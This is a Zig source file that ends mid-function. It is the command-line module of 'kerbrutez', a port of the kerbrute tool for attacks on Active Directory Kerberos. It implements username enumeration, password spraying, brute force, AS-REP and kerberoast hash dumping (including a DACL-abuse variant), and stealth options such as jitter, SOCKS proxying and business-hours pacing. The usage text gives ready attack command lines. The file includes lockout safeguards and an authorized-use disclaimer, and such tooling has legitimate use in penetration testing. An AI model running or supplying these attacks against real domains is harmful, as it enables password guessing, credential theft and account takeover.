//! Command-line interface: global flags, the five subcommands (userenum,
//! passwordspray, bruteuser, bruteforce, version) and the producer loop that
//! streams a wordlist/combo file (or stdin) into the worker pool.

const std = @import("std");
const Allocator = std.mem.Allocator;
const Io = std.Io;
const krb5 = @import("krb5");
const ldap = @import("ldap");

const banner = @import("util/banner.zig");
const version = @import("util/version.zig");
const username_util = @import("util/username.zig");
const hashutil = @import("util/hash.zig");
const Logger = @import("util/log.zig").Logger;
const session_mod = @import("session/session.zig");
const Session = session_mod.Session;
const workers = @import("workers.zig");
const store_mod = @import("state/store.zig");
const dedup_mod = @import("state/dedup.zig");
const budget_mod = @import("engine/budget.zig");
const policy_mod = @import("policy/policy.zig");
const opsec = @import("engine/opsec.zig");
const report_mod = @import("report/report.zig");
const status_mod = @import("util/status.zig");
const secret_file = @import("util/secret_file.zig");
const bloodhound = @import("bloodhound.zig");

pub const Flags = struct {
    domain: ?[]const u8 = null,
    dc: ?[]const u8 = null,
    output: ?[]const u8 = null,
    verbose: bool = false,
    safe: bool = false,
    threads: usize = 10,
    delay_ms: u64 = 0,
    /// AS-REQ enctype preference. Default `.all` = the full list (noise level 3).
    /// `.aes` is stealthier/modern; `.rc4` (== --downgrade) is deprecated.
    etype: krb5.config.EtypePref = .all,
    /// Home dir for the persisted "hide etype warning" preference (from $HOME).
    home_dir: ?[]const u8 = null,
    /// userenum: dump `$krb5asrep$` hashes for no-pre-auth accounts.
    asrep: bool = false,
    /// userenum: probe which etypes the KDC accepts per user (matrix).
    etype_probe: bool = false,
    hash_file: ?[]const u8 = null,
    user_as_pass: bool = false,
    help: bool = false,
    // Campaign / state (M1)
    state_path: ?[]const u8 = null,
    dedup_scope: []const u8 = "realm", // "realm" | "none"
    /// Disable the shared per-realm state log entirely (no record/dedup/collision
    /// check) AND the auto-saved findings file. Forfeits the cross-run lockout
    /// safeguard. Writes no local artifact unless one is explicitly requested
    /// with -o / --hash-file.
    no_state: bool = false,
    /// Auto-confirm the pre-spray collision prompt (for automation / known-safe).
    yes: bool = false,
    /// Re-attempt (user,password) combos already in the log instead of skipping.
    retry: bool = false,
    /// Re-test accounts the state log already records as locked/disabled. Off by
    /// default: touching a locked account only re-confirms the lockout, adds
    /// noise, and (on some policies) extends the lockout window.
    retry_locked: bool = false,
    // Lockout budget / cadence (M2)
    lockout_threshold: u32 = 5,
    lockout_window_min: u32 = 30,
    attempts_per_window: ?u32 = null, // null => threshold - 1
    window_margin_min: u32 = 1,
    panic_after: u32 = 3,
    // LDAP (M3)
    ldap_user: ?[]const u8 = null,
    ldap_pass: ?[]const u8 = null,
    ldap_server: ?[]const u8 = null, // host[:port]; default <dc-host>:389
    exclude_disabled: bool = false,
    /// Offline user source: a BloodHound users.json / dir / .zip (ldapenum).
    bloodhound: ?[]const u8 = null,
    /// kerberoast: roast this single SPN instead of LDAP-enumerating accounts.
    userspn: ?[]const u8 = null,
    /// kerberoast C2: a DONT_REQUIRE_PREAUTH account used to roast --userspn with
    /// NO credentials (AS-REQ-with-sname).
    nopreauth_user: ?[]const u8 = null,
    /// kerberoast C3: a GenericWrite victim — write a temp SPN onto it, roast,
    /// then restore (DACL-abuse targeted kerberoast). Bind user = the abuser.
    target_user: ?[]const u8 = null,
    // Policy (M4)
    policy_fetch: bool = false,
    check_badpwdcount: bool = false,
    // OPSEC (M9). null overrides fall back to the --noise profile.
    noise: opsec.NoiseLevel = .loud,
    jitter_ms: ?u64 = null,
    rpm: ?u32 = null,
    randomize: ?bool = null,
    business_hours: ?bool = null,
    tz_offset: i32 = 0,
    canary_file: ?[]const u8 = null,
    socks: ?[]const u8 = null,
    dns_server: ?[]const u8 = null,
    // Reporting (M10).
    json: bool = false,
    webhook: ?[]const u8 = null,
};

const usage_text =
    "kerbrutez " ++ version.version ++ "  (built with Zig " ++ version.zig_version ++ ")\n" ++
    \\
    \\kerbrutez - A Zig port by @ibnbajja of ropnop's kerbrute. Bruteforce attacks against Kerberos pre-auth.
    \\
    \\Usage:
    \\  kerbrutez [command] [flags] <args>
    \\
    \\Commands:
    \\  userenum              <username_wordlist>            Enumerate valid domain usernames via Kerberos (--asrep, --etype-probe)
    \\  passwordspray         <username_wordlist> <password> Test a single password against a list of users
    \\  bruteuser             <password_list> <username>     Bruteforce a single user's password from a wordlist
    \\  bruteforce            <user_pw_file>                 Bruteforce username:password combos (file or '-')
    \\  spraycampaign         <user(s)> <password(s)>        Resumable, deduped, lockout-paced spray. Each arg is a
    \\                                                       wordlist file OR a single value (any combination).
    \\  ldapenum                                             Enumerate users via LDAP, or offline from BloodHound (--bloodhound)
    \\  kerberoast                                           Request TGS tickets for SPN accounts and dump $krb5tgs$ hashes
    \\  wizard                                               Interactive guided mode: answer prompts, review, run
    \\  version                                              Display version info and quit
    \\
    \\Global flags:
    \\  -d, --domain string    The full domain to use (e.g. contoso.com)
    \\      --dc string        The Domain Controller (KDC) to target. If blank, discovered via DNS SRV.
    \\                         Accepts a comma-separated list (dc1,dc2,dc3) to spread attempts across
    \\                         DCs round-robin (also gives failover). NOTE: this spreads LOAD and logs,
    \\                         not lockout risk — AD checks bad passwords against the PDC, so the
    \\                         per-user budget stays domain-wide.
    \\      --dns string       DNS server for SRV KDC discovery when --dc is blank (point at the AD DNS)
    \\  -o, --output string    File to write logs to
    \\  -v, --verbose          Log failures and errors
    \\      --safe             Abort if any user comes back as locked out
    \\  -t, --threads int      Threads to use (default 10). For password-guessing
    \\                         it is capped at --panic-after (default 3) and the stop
    \\                         trips early so lockouts never exceed it; 1 under --safe.
    \\                         Raise --panic-after for more concurrency.
    \\      --delay int        Delay in ms between attempts (forces single thread)
    \\      --etype string     AS-REQ enctype: all (default, noise 3) | aes (stealthier/modern, slow to crack) | rc4 (deprecated, crackable)
    \\      --downgrade        Alias for --etype rc4 (arcfour-hmac-md5)
    \\      --asrep            (userenum) Dump $krb5asrep$ hashes for no-pre-auth accounts (mode 18200/19600/19700)
    \\      --etype-probe      (userenum) Probe which etypes the KDC accepts per user (matrix; no password sent)
    \\      --hash-file string File to save AS-REP hashes to
    \\      --user-as-pass     (passwordspray) Spray each account with its username as the password
    \\
    \\Campaign / lockout-budget flags (campaigns; bruteuser auto-promotes if its list is large):
    \\      --state string         NDJSON state file (default kerbrutez-<realm>.ndjson). Replayed to resume.
    \\                             Shared per realm, so independent runs see each other's attempts.
    \\      --no-state             Don't read/write the shared state log (no dedup, no collision check) and
    \\                             don't auto-save findings; only -o / --hash-file write to disk
    \\      --dedup-scope str      realm (default; skip a combo already tried in this realm) | none
    \\      --retry                Re-attempt (user,password) combos already in the log (default: skip them)
    \\      --retry-locked         Re-test accounts already logged as locked/disabled (default: skip them
    \\                             until the domain lockout duration has elapsed, then retry automatically)
    \\  -y, --yes                  Auto-confirm the pre-spray collision warning (for automation)
    \\      --lockout-threshold n  Assumed AD lockout threshold (default 5)
    \\      --lockout-window n     Observation window in minutes (default 30)
    \\      --attempts-per-window n Attempts/user/window (default threshold-1 = 4)
    \\      --window-margin n      Extra minutes to wait past the window (default 1)
    \\      --panic-after n        Hard cap on lockouts (default 3): never lock more
    \\                             than n accounts. Also caps -t and trips early so
    \\                             in-flight attempts can't overshoot.
    \\      --policy-fetch         Read the real lockout policy from AD via LDAP (needs --ldap-user/-pass)
    \\      --check-badpwdcount    Pre-read each account's badPwdCount over LDAP to shrink the first window
    \\
    \\OPSEC flags (timing/selection noise only — NEVER relaxes the lockout budget):
    \\      --noise 1|2|3          1=stealthy, 2=moderate, 3=loud (default; assumes an authorized engagement)
    \\      --jitter ms            Random extra delay (0..ms) before each attempt (overrides the noise profile)
    \\      --rpm n                Cap attempts to n requests/minute across all threads
    \\      --randomize            Shuffle the order of users/passwords
    \\      --business-hours       Only run Mon-Fri 08:00-18:00; otherwise stand down
    \\      --tz-offset h          Target UTC offset in hours for --business-hours (default 0)
    \\      --canary-file path     Usernames to NEVER touch (honeypot/canary accounts), one per line
    \\      --socks host:port      Route KDC traffic through a SOCKS5 proxy (TCP; the proxy resolves the DC)
    \\
    \\Reporting flags:
    \\      --json                 Print a JSON findings report to stdout at the end
    \\      --webhook url          POST the JSON report to an http:// webhook when a cred/lockout is found
    \\  -o <base>                  Also write <base>.json / .grep.txt / .raw.txt / .cred.hc<mode> (one per hashcat
    \\                             mode) + .cred.nomode for hashes hashcat cannot crack (AES AS-REPs -> use John)
    \\                             (Findings are ALSO auto-saved to ~/.local/share/kerbrutez/logs/)
    \\      (Windows footprint: failed pre-auth -> Event 4771; AS-REQ/TGT -> 4768; TGS-REQ -> 4769)
    \\
    \\LDAP flags (ldapenum):
    \\      --ldap-server host[:port]  LDAP server (default: the --dc host on port 389)
    \\      --ldap-user string         Bind user (UPN or sAMAccountName; blank = anonymous)
    \\      --ldap-pass string         Bind password
    \\      --exclude-disabled         Drop disabled accounts from the output
    \\      --bloodhound path          Offline source: a BloodHound users.json, a dir, or a SharpHound .zip
    \\      -o string                  Write the bare username list to this file (working list)
    \\
    \\Kerberoast flags (kerberoast):
    \\      --ldap-user string         Domain credential used to get a TGT (and to enumerate SPNs over LDAP)
    \\      --ldap-pass string         Password for the credential above
    \\      --userspn SPN              Roast a single SPN (e.g. MSSQLSvc/host.dom:1433) instead of LDAP-enumerating
    \\      --nopreauth-user user      C2: roast --userspn with NO creds, via this DONT_REQUIRE_PREAUTH account
    \\      --target-user user         C3: DACL abuse — write a temp SPN onto this GenericWrite victim, roast, restore
    \\      --hash-file string         Append captured $krb5tgs$ hashes to this file
    \\
    \\Examples:
    \\  # Enumerate valid usernames (Kerberos pre-auth probing)
    \\  kerbrutez userenum -d corp.local --dc 10.0.0.10 users.txt
    \\  # Dump AS-REP-roastable hashes while enumerating
    \\  kerbrutez userenum -d corp.local --dc 10.0.0.10 --asrep -o run users.txt
    \\  # Lockout-safe password spray (auto-promotes to a resumable campaign)
    \\  kerbrutez passwordspray -d corp.local --dc 10.0.0.10 --policy-fetch --ldap-user joe --ldap-pass P users.txt 'Spring2026!'
    \\  # Kerberoast every SPN account with a working credential
    \\  kerbrutez kerberoast -d corp.local --dc 10.0.0.10 --ldap-user joe --ldap-pass P -o roast
    \\  # Credential-less kerberoast via a no-preauth account (C2)
    \\  kerbrutez kerberoast -d corp.local --dc 10.0.0.10 --nopreauth-user svc_norpre --userspn MSSQLSvc/db.corp.local:1433
    \\  # Stealthy spray through a SOCKS proxy, only during business hours
    \\  kerbrutez passwordspray -d corp.local --dc 10.0.0.10 --noise 1 --socks 127.0.0.1:1080 --canary-file bait.txt users.txt 'P'
    \\  # Offline triage from a BloodHound/SharpHound dump (no network)
    \\  kerbrutez ldapenum -d corp.local --bloodhound ./sharphound.zip -o working_users.txt
    \\
    \\For AUTHORIZED security testing only. Use only against systems you own or have explicit written
    \\permission to assess. You are responsible for complying with all applicable laws.
    \\

;

/// Entry point invoked from main(). `args` includes the program name at [0].
/// `home` is $HOME (for the persisted etype-warning preference) or null.
/// Returns a process exit code.
pub fn run(allocator: Allocator, io: Io, args: []const []const u8, home: ?[]const u8) u8 {
    var flags = Flags{};
    flags.home_dir = home;
    var positionals: std.ArrayList([]const u8) = .empty;
    defer positionals.deinit(allocator);
    var subcommand: ?[]const u8 = null;

    parseArgs(args, &flags, &positionals, &subcommand, allocator) catch {
        printErr(io, "error parsing arguments\n", .{});
        return 1;
    };

    if (flags.delay_ms != 0) flags.threads = 1;

    const cmd = subcommand orelse {
        printOut(io, "{s}", .{usage_text});
        return if (flags.help) 0 else 1;
    };

    if (std.mem.eql(u8, cmd, "version")) {
        printOut(io, "Version:        {s}\nBuilt with Zig: {s}\nAuthor:         {s}\n", .{ version.version, version.zig_version, version.author });
        return 0;
    }
    if (flags.help or std.mem.eql(u8, cmd, "help")) {
        printOut(io, "{s}", .{usage_text});
        return 0;
    }

    if (std.mem.eql(u8, cmd, "userenum")) return runUserenum(allocator, io, flags, positionals.items);
    if (std.mem.eql(u8, cmd, "passwordspray")) return runPasswordspray(allocator, io, flags, positionals.items, false);
    if (std.mem.eql(u8, cmd, "bruteuser")) return runBruteuser(allocator, io, flags, positionals.items, false);
    if (std.mem.eql(u8, cmd, "bruteforce")) return runBruteforce(allocator, io, flags, positionals.items);
    if (std.mem.eql(u8, cmd, "spraycampaign")) return runSprayCampaign(allocator, io, flags, positionals.items);
    if (std.mem.eql(u8, cmd, "ldapenum")) return runLdapenum(allocator, io, flags);
    if (std.mem.eql(u8, cmd, "kerberoast")) return runKerberoast(allocator, io, flags);
    if (std.mem.eql(u8, cmd, "wizard")) return runWizard(allocator, io, flags);

    printErr(io, "unknown command: {s}\n\n{s}", .{ cmd, usage_text });
    return 1;
}

// ===========================================================================
// Argument parsing
// ===========================================================================

/// Parse global flags, the subcommand, and positional args. Flags may appear
/// before or after the subcommand. Supports "--flag value" and "--flag=value".
fn parseArgs(
    args: []const []const u8,
    flags: *Flags,
    positionals: *std.ArrayList([]const u8),
    subcommand: *?[]const u8,
    allocator: Allocator,
) !void {
    var i: usize = 1; // skip program name
    while (i < args.len) : (i += 1) {
        const arg = args[i];
        // Split "--flag=value" into name and inline value.
        var name = arg;
        var inline_val: ?[]const u8 = null;
        if (std.mem.startsWith(u8, arg, "--")) {
            if (std.mem.indexOfScalar(u8, arg, '=')) |eq| {
                name = arg[0..eq];
                inline_val = arg[eq + 1 ..];
            }
        }

        const Need = enum { domain, dc, output, threads, delay, hash_file, etype, state, dedup_scope, lockout_threshold, lockout_window, attempts_per_window, window_margin, panic_after, ldap_user, ldap_pass, ldap_server, bloodhound, userspn, nopreauth_user, target_user, noise, jitter, rpm, tz_offset, canary_file, socks, dns_server, webhook, none };
        var need: Need = .none;

        if (eqAny(name, &.{ "-d", "--domain" })) {
            need = .domain;
        } else if (std.mem.eql(u8, name, "--dc")) {
            need = .dc;
        } else if (eqAny(name, &.{ "-o", "--output" })) {
            need = .output;
        } else if (eqAny(name, &.{ "-t", "--threads" })) {
            need = .threads;
        } else if (std.mem.eql(u8, name, "--delay")) {
            need = .delay;
        } else if (std.mem.eql(u8, name, "--hash-file")) {
            need = .hash_file;
        } else if (std.mem.eql(u8, name, "--etype")) {
            need = .etype;
        } else if (std.mem.eql(u8, name, "--state")) {
            need = .state;
        } else if (std.mem.eql(u8, name, "--dedup-scope")) {
            need = .dedup_scope;
        } else if (std.mem.eql(u8, name, "--lockout-threshold")) {
            need = .lockout_threshold;
        } else if (std.mem.eql(u8, name, "--lockout-window")) {
            need = .lockout_window;
        } else if (std.mem.eql(u8, name, "--attempts-per-window")) {
            need = .attempts_per_window;
        } else if (std.mem.eql(u8, name, "--window-margin")) {
            need = .window_margin;
        } else if (std.mem.eql(u8, name, "--panic-after")) {
            need = .panic_after;
        } else if (std.mem.eql(u8, name, "--ldap-user")) {
            need = .ldap_user;
        } else if (std.mem.eql(u8, name, "--ldap-pass")) {
            need = .ldap_pass;
        } else if (std.mem.eql(u8, name, "--ldap-server")) {
            need = .ldap_server;
        } else if (std.mem.eql(u8, name, "--bloodhound")) {
            need = .bloodhound;
        } else if (std.mem.eql(u8, name, "--userspn")) {
            need = .userspn;
        } else if (std.mem.eql(u8, name, "--nopreauth-user")) {
            need = .nopreauth_user;
        } else if (std.mem.eql(u8, name, "--target-user")) {
            need = .target_user;
        } else if (std.mem.eql(u8, name, "--noise")) {
            need = .noise;
        } else if (std.mem.eql(u8, name, "--jitter")) {
            need = .jitter;
        } else if (std.mem.eql(u8, name, "--rpm")) {
            need = .rpm;
        } else if (std.mem.eql(u8, name, "--tz-offset")) {
            need = .tz_offset;
        } else if (std.mem.eql(u8, name, "--canary-file")) {
            need = .canary_file;
        } else if (std.mem.eql(u8, name, "--socks")) {
            need = .socks;
        } else if (std.mem.eql(u8, name, "--dns")) {
            need = .dns_server;
        } else if (std.mem.eql(u8, name, "--webhook")) {
            need = .webhook;
        } else if (std.mem.eql(u8, name, "--json")) {
            flags.json = true;
            continue;
        } else if (std.mem.eql(u8, name, "--randomize")) {
            flags.randomize = true;
            continue;
        } else if (std.mem.eql(u8, name, "--business-hours")) {
            flags.business_hours = true;
            continue;
        } else if (std.mem.eql(u8, name, "--exclude-disabled")) {
            flags.exclude_disabled = true;
            continue;
        } else if (std.mem.eql(u8, name, "--policy-fetch")) {
            flags.policy_fetch = true;
            continue;
        } else if (std.mem.eql(u8, name, "--check-badpwdcount")) {
            flags.check_badpwdcount = true;
            continue;
        } else if (eqAny(name, &.{ "-v", "--verbose" })) {
            flags.verbose = true;
            continue;
        } else if (std.mem.eql(u8, name, "--safe")) {
            flags.safe = true;
            continue;
        } else if (std.mem.eql(u8, name, "--no-state")) {
            flags.no_state = true;
            continue;
        } else if (eqAny(name, &.{ "-y", "--yes" })) {
            flags.yes = true;
            continue;
        } else if (std.mem.eql(u8, name, "--retry")) {
            flags.retry = true;
            continue;
        } else if (std.mem.eql(u8, name, "--retry-locked")) {
            flags.retry_locked = true;
            continue;
        } else if (std.mem.eql(u8, name, "--downgrade")) {
            flags.etype = .rc4; // alias for --etype rc4
            continue;
        } else if (std.mem.eql(u8, name, "--asrep")) {
            flags.asrep = true;
            continue;
        } else if (std.mem.eql(u8, name, "--etype-probe")) {
            flags.etype_probe = true;
            continue;
        } else if (std.mem.eql(u8, name, "--user-as-pass")) {
            flags.user_as_pass = true;
            continue;
        } else if (eqAny(name, &.{ "-h", "--help" })) {
            flags.help = true;
            continue;
        } else if (std.mem.startsWith(u8, arg, "-") and arg.len > 1) {
            return error.UnknownFlag;
        } else {
            // Positional: first one is the subcommand.
            if (subcommand.* == null) {
                subcommand.* = arg;
            } else {
                try positionals.append(allocator, arg);
            }
            continue;
        }

        // Resolve the value for a value-taking flag.
        const value = inline_val orelse blk: {
            i += 1;
            if (i >= args.len) return error.MissingFlagValue;
            break :blk args[i];
        };
        switch (need) {
            .domain => flags.domain = value,
            .dc => flags.dc = value,
            .output => flags.output = value,
            .hash_file => flags.hash_file = value,
            .etype => flags.etype = krb5.config.EtypePref.parse(value) orelse return error.InvalidEtype,
            .threads => flags.threads = std.fmt.parseInt(usize, value, 10) catch return error.InvalidNumber,
            .delay => flags.delay_ms = std.fmt.parseInt(u64, value, 10) catch return error.InvalidNumber,
            .state => flags.state_path = value,
            .dedup_scope => flags.dedup_scope = value,
            .lockout_threshold => flags.lockout_threshold = std.fmt.parseInt(u32, value, 10) catch return error.InvalidNumber,
            .lockout_window => flags.lockout_window_min = std.fmt.parseInt(u32, value, 10) catch return error.InvalidNumber,
            .attempts_per_window => flags.attempts_per_window = std.fmt.parseInt(u32, value, 10) catch return error.InvalidNumber,
            .window_margin => flags.window_margin_min = std.fmt.parseInt(u32, value, 10) catch return error.InvalidNumber,
            .panic_after => flags.panic_after = std.fmt.parseInt(u32, value, 10) catch return error.InvalidNumber,
            .ldap_user => flags.ldap_user = value,
            .ldap_pass => flags.ldap_pass = value,
            .ldap_server => flags.ldap_server = value,
            .bloodhound => flags.bloodhound = value,
            .userspn => flags.userspn = value,
            .nopreauth_user => flags.nopreauth_user = value,
            .target_user => flags.target_user = value,
            .noise => flags.noise = opsec.NoiseLevel.parse(value) orelse return error.InvalidNoise,
            .jitter => flags.jitter_ms = std.fmt.parseInt(u64, value, 10) catch return error.InvalidNumber,
            .rpm => flags.rpm = std.fmt.parseInt(u32, value, 10) catch return error.InvalidNumber,
            .tz_offset => flags.tz_offset = std.fmt.parseInt(i32, value, 10) catch return error.InvalidNumber,
            .canary_file => flags.canary_file = value,
            .socks => flags.socks = value,
            .dns_server => flags.dns_server = value,
            .webhook => flags.webhook = value,
            .none => unreachable, // UNREACHABLE: only value-taking flags reach here
        }
    }
}

fn eqAny(s: []const u8, options: []const []const u8) bool {
    for (options) |o| {
        if (std.mem.eql(u8, s, o)) return true;
    }
    return false;
}

// ===========================================================================
// Commands
// ===========================================================================

fn buildSession(allocator: Allocator, io: Io, logger: *Logger, flags: Flags, force_safe: bool) ?Session {
    const domain = flags.domain orelse {
        logger.err("domain must not be empty (use -d/--domain)", .{});
        return null;
    };
    warnEtypeTradeoff(io, logger, flags.etype, flags.home_dir);
    return Session.init(allocator, io, logger, .{
        .domain = domain,
        .domain_controller = flags.dc,
        .verbose = flags.verbose,
        .safe = flags.safe or force_safe,
        .etype = flags.etype,
        .asrep_dump = flags.asrep,
        .socks = flags.socks,
        .dns_server = flags.dns_server,
        .hash_filename = flags.hash_file,
    }) catch return null;
}

/// The §7 tradeoff message for an explicit `--etype` choice, or null for the
/// default (`.all`), which is unannotated. Pure (testable).
fn etypeWarningText(etype: krb5.config.EtypePref) ?[]const u8 {
    return switch (etype) {
        .all => null, // default (noise level 3) — no nag
        .rc4 => "[!] --etype rc4 (arcfour-hmac-md5) is DEPRECATED on modern AD and may be rejected (KDC_ERR_ETYPE_NOSUPP). It does yield a crackable hash — verify the KDC still accepts it with `userenum --etype-probe`.",
        .aes => "[!] --etype aes is stealthier and more modern than RC4, but the resulting AS-REP/TGS hashes are SIGNIFICANTLY slower to crack.",
    };
}

/// Interpret a Y/n answer to "hide this message?" — default (empty/EOF) is Yes.
/// Pure (testable).
fn parseHideAnswer(line: ?[]const u8) bool {
    const l = line orelse return true; // EOF => default Yes
    const t = std.mem.trim(u8, l, " \t\r\n");
    if (t.len == 0) return true; // Enter => default Yes
    return t[0] == 'y' or t[0] == 'Y';
}

/// §7 tradeoff warning for an explicit `--etype` choice. Shown every run until
/// the operator opts to hide it; the FIRST interactive time, we ask whether to
/// suppress it in future (default Yes) and persist that under
/// `$HOME/.config/kerbrutez/`. The default etype (`.all`) is never annotated.
fn warnEtypeTradeoff(io: Io, logger: *Logger, etype: krb5.config.EtypePref, home: ?[]const u8) void {
    const msg = etypeWarningText(etype) orelse return;

    var dirbuf: [512]u8 = undefined;
    const dir: ?[]const u8 = if (home) |h|
        (std.fmt.bufPrint(&dirbuf, "{s}/.config/kerbrutez", .{h}) catch null)
    else
        null;

    // Already hidden? Stay silent.
    if (dir) |d| if (markerExists(io, d, "etype_warn_hidden")) return;

    logger.warning("{s}", .{msg});

    // Can't persist (no HOME) — warn each run, never prompt.
    const d = dir orelse return;
    // Only ask once, and only when interactive.
    if (markerExists(io, d, "etype_warn_asked")) return;
    const stdin = Io.File.stdin();
    const is_tty = stdin.isTty(io) catch false;
    if (!is_tty) return;

    printOut(io, "    Hide this message in future runs? [Y/n] ", .{});
    const answer = readLineStdin(io);
    writeMarker(io, d, "etype_warn_asked"); // don't re-prompt regardless of answer
    if (parseHideAnswer(answer)) {
        writeMarker(io, d, "etype_warn_hidden");
        logger.info("OK — hiding the etype warning. Delete {s}/etype_warn_hidden to re-enable it.", .{d});
    }
}

/// True if `<dir>/<name>` exists (absolute path access). Missing dir/file => false.
fn markerExists(io: Io, dir: []const u8, name: []const u8) bool {
    var buf: [600]u8 = undefined;
    const path = std.fmt.bufPrint(&buf, "{s}/{s}", .{ dir, name }) catch return false;
    Io.Dir.cwd().access(io, path, .{}) catch return false;
    return true;
}

/// Create `<dir>/<name>` (and intermediate dirs). Best-effort; ignores errors.
fn writeMarker(io: Io, dir: []const u8, name: []const u8) void {
    Io.Dir.cwd().createDirPath(io, dir) catch {};
    var buf: [600]u8 = undefined;
    const path = std.fmt.bufPrint(&buf, "{s}/{s}", .{ dir, name }) catch return;
    const f = Io.Dir.cwd().createFile(io, path, .{ .truncate = true }) catch return;
    f.close(io);
}

/// Read one line from stdin, returning it without the trailing newline, or null
/// on EOF/error. The slice borrows a static buffer (single-threaded CLI setup).
var stdin_line_buf: [128]u8 = undefined;
fn readLineStdin(io: Io) ?[]const u8 {
    const f = Io.File.stdin();
    var r = f.reader(io, &stdin_line_buf);
    return r.interface.takeDelimiter('\n') catch return null;
}

fn runUserenum(allocator: Allocator, io: Io, flags: Flags, args: []const []const u8) u8 {
    if (args.len != 1) return cmdArgError(io, "userenum requires <username_wordlist>");
    if (flags.etype_probe) return runEtypeProbe(allocator, io, flags, args[0]);
    return runPool(allocator, io, flags, .{ .path = args[0] }, .enumerate, false, false, false, "usernames", "valid", null);
}

/// Probe, per user, which etypes the KDC will issue a ticket under — one
/// passwordless AS-REQ per candidate etype. Builds the accepted-etype matrix
/// (§7) without ever sending a credential.
fn runEtypeProbe(allocator: Allocator, io: Io, flags: Flags, input_path: []const u8) u8 {
    var logger = Logger.init(io, flags.verbose, flags.output) catch return 1;
    defer logger.deinit();

    var session = buildSession(allocator, io, &logger, flags, false) orelse return 1;
    defer session.deinit();

    const content = readInput(allocator, io, input_path) catch {
        logger.err("could not read input {s}", .{input_path});
        return 1;
    };
    defer allocator.free(content);
    const lines = splitLines(allocator, content) catch return 1;
    defer allocator.free(lines);

    // Candidate etypes, strongest first: aes256, aes128, rc4.
    const candidates = [_]i32{
        krb5.iana.etype_id.aes256_cts_hmac_sha1_96,
        krb5.iana.etype_id.aes128_cts_hmac_sha1_96,
        krb5.iana.etype_id.rc4_hmac,
    };
    logger.info("etype-acceptance matrix (passwordless AS-REQ per etype): columns aes256 aes128 rc4", .{});

    // The probe sends one passwordless AS-REQ PER ETYPE PER USER — three 4768
    // events each — from its own loop, outside the worker pool. It therefore
    // ignored --canary and --noise entirely: a "stealthy" probe still fired
    // back-to-back, and a honeypot account got probed like any other.
    var probe_canary: ?opsec.CanarySet = null;
    defer if (probe_canary) |*c| c.deinit();
    if (flags.canary_file) |path| {
        if (opsec.CanarySet.loadFromFile(allocator, io, path)) |cs| {
            probe_canary = cs;
            logger.info("[opsec] canary list loaded: {d} protected account(s) will never be probed", .{cs.count()});
        } else |_| {
            logger.warning("[opsec] couldn't read canary file {s} — proceeding WITHOUT canary protection", .{path});
        }
    }
    const probe_prof = opsec.Profile.fromNoise(flags.noise);
    var probe_gov = opsec.Governor.init(
        @bitCast(Io.Timestamp.now(io, .real).toMicroseconds()),
        flags.jitter_ms orelse probe_prof.jitter_ms,
        flags.rpm orelse probe_prof.rpm,
    );
    if (!probe_gov.isNoop()) {
        logger.info("[opsec] pacing probe requests: jitter <= {d}ms, {d} req/min", .{ probe_gov.jitter_ms, flags.rpm orelse probe_prof.rpm });
    }

    var client = krb5.client.Client.init(allocator, io, &session.config);
    var probed: u32 = 0;
    for (lines) |raw| {
        const user = std.mem.trim(u8, raw, " \t\r");
        if (user.len == 0) continue;
        if (canaryBlocks(probe_canary, user, &logger)) continue;
        probed += 1;

        var fbuf: [256]u8 = undefined;
        var fb = std.Io.Writer.fixed(&fbuf);
        var unknown = false;
        for (candidates) |et| {
            paceRequest(io, &probe_gov, flags.delay_ms); // every etype is a separate AS-REQ
            const p = client.probeEtype(user, et);
            const sym: []const u8 = switch (p.status) {
                .accepted => "  yes ",
                .not_supported => "  no  ",
                .user_unknown => blk: {
                    unknown = true;
                    break :blk "  ?   ";
                },
                .network_error => " neterr",
                .other => " err  ",
            };
            fb.writeAll(sym) catch {};
        }
        if (unknown) {
            logger.notice("[-] {s}{s}  (user unknown)", .{ user, fb.buffered() });
        } else {
            logger.notice("[+] {s}{s}", .{ user, fb.buffered() });
        }
    }
    logger.info("Done! Probed {d} user(s)", .{probed});
    return 0;
}

fn runPasswordspray(allocator: Allocator, io: Io, flags: Flags, args: []const []const u8, campaign: bool) u8 {
    const noun = if (campaign) "passwordspraycampaign" else "passwordspray";
    if (flags.user_as_pass) {
        if (args.len != 1) return cmdArgError(io, noun);
        return runPool(allocator, io, flags, .{ .path = args[0] }, .spray_user_as_pass, false, false, campaign, "logins", "successes", null);
    }
    if (args.len != 2) return cmdArgError(io, "passwordspray requires <username_wordlist> <password> (or --user-as-pass)");
    return runPool(allocator, io, flags, .{ .path = args[0] }, .{ .spray = args[1] }, false, false, campaign, "logins", "successes", null);
}

fn runBruteuser(allocator: Allocator, io: Io, flags: Flags, args: []const []const u8, campaign: bool) u8 {
    if (args.len != 2) return cmdArgError(io, "bruteuser requires <password_list> <username>");
    // The username is the second arg; format it once.
    const user = username_util.formatUsername(args[1]) catch {
        printErr(io, "invalid username: {s}\n", .{args[1]});
        return 1;
    };
    // bruteuser always runs in safe mode and stops on first success.
    return runPool(allocator, io, flags, .{ .path = args[0] }, .{ .bruteuser = user }, true, true, campaign, "logins", "successes", null);
}

fn runBruteforce(allocator: Allocator, io: Io, flags: Flags, args: []const []const u8) u8 {
    if (args.len != 1) return cmdArgError(io, "bruteforce requires <user_pw_file> (or '-')");
    return runPool(allocator, io, flags, .{ .path = args[0] }, .bruteforce, false, false, false, "logins", "successes", null);
}

/// Unified resumable spray campaign: `<users> <passwords>`, where each argument
/// is either a wordlist FILE or a single literal value (any combination works).
/// Subsumes passwordspraycampaign and bruteusercampaign. Combos are sprayed in
/// lockout-safe password-major order (one password vs all users per round) and
/// logged/deduped/paced exactly like the other campaigns.
fn runSprayCampaign(allocator: Allocator, io: Io, flags: Flags, args: []const []const u8) u8 {
    if (args.len != 2) return cmdArgError(io, "spraycampaign requires <users> <passwords> (each a wordlist file or a single value)");

    var users_backing: ?[]u8 = null;
    defer if (users_backing) |b| allocator.free(b);
    const users = resolveList(allocator, io, args[0], &users_backing) catch {
        printErr(io, "could not read users: {s}\n", .{args[0]});
        return 1;
    };
    defer allocator.free(users);

    var pass_backing: ?[]u8 = null;
    defer if (pass_backing) |b| allocator.free(b);
    const passwords = resolveList(allocator, io, args[1], &pass_backing) catch {
        printErr(io, "could not read passwords: {s}\n", .{args[1]});
        return 1;
    };
    defer allocator.free(passwords);

    // Build the matrix in PASSWORD-MAJOR order so the per-user lockout budget
    // paces between rounds (a round = one password against every user).
    var combos: std.ArrayList([]const u8) = .empty;
    defer {
        for (combos.items) |c| allocator.free(c);
        combos.deinit(allocator);
    }
    var n_users: usize = 0;
    var n_pass: usize = 0;
    for (passwords) |pw| {
        if (pw.len == 0) continue;
        n_pass += 1;
        for (users) |u| {
            if (u.len == 0) continue;
